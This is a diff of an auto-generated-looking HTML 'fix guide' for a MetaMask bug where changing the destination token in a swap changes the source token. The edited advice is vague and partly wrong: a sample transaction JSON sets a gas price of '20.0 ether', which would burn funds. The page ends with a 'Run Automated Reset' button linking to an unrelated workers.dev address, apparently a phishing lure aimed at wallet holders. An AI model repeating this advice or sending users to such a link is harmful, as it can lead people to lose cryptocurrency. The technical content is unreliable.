@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Swaps Changing The Destination Token Cha – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -42,36 +42,35 @@
 <h1>Metamask Extension Bug Swaps Changing The Destination Token Cha</h1>
 <h2>Symptom</h2>
 <ul>
-<li>When attempting to swap tokens using Metamask, changing the destination token unexpectedly alters the source token instead of updating the destination token as intended.</li>
+<li>When attempting to swap tokens using the Metamask extension, users may encounter an issue where changing the destination token unexpectedly alters the source token instead, leading to unintended transaction configurations.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a bug within the Metamask extension, specifically affecting the swap functionality. The issue arises from a mismanaged state update, where the source token is incorrectly updated when the destination token is changed.</li>
+<li>This error occurs due to a bug within the Metamask extension's swap functionality, where the token selection inputs are not properly isolated, causing changes to one input to inadvertently affect the other.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, users can attempt the following manual overrides:</li>
-<li>Refresh the Metamask extension and retry the swap operation.</li>
-<li>Manually input the destination token's contract address to bypass the token selection interface.</li>
-<li>Utilize the following JSON configuration to force-update the token list:</li>
+<li>To temporarily bypass this issue, users can try the following manual overrides:</li>
+<li>Directly editing the transaction data in the extension's advanced settings</li>
+<li>Utilizing a third-party swapping service that doesn't rely on the Metamask extension for token selection</li>
+<li>Employing a custom script to interact with the Ethereum blockchain, such as:
+  <code>json
+  {
+    "from": "0x...source_address",
+    "to": "0x...destination_address",
+    "value": "1.0 ether",
+    "gas": "20000",
+    "gasPrice": "20.0 ether"
+  }</code>
+Consider using an external console for more complex transaction configurations.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;tokens&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...destination_token_address&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;DEST&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">]</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Consider executing these commands in a dedicated environment. 
-Prerequisites:
-* Metamask extension version 10.23.1 or later
-* Ethereum mainnet or compatible testnet selected
-* Sufficient ETH balance for transaction fees</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-batch-sell-no-warning-appears-when-batch.html">Metamask Extension Bug Batch Sell No Warning Appears When Batch</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>Sufficient ETH for transaction fees</li>
+<li>Familiarity with Ethereum blockchain transactions and token swapping mechanisms</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
